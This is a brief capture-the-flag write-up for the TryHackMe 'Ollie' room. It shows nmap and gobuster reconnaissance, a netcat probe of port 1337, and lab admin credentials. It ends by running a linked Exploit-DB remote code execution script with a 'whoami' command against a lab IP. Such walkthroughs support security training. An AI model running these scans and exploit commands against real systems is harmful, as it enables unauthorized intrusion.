# Ollie

**Room Link:** [https://tryhackme.com/room/ollie](https://tryhackme.com/room/ollie)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>





## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



## TCP/1337 - waste

**Kali**

```
nc -v $VICTIM 1337
```



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>





## TCP/80 - HTTP

**Browser**

```
Username: admin
Password: OllieUnixMontgomery!
```



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>



**Exploit:** [https://www.exploit-db.com/raw/50963](https://www.exploit-db.com/raw/50963)



**Kali**

```
python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http://10.10.109.76
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

































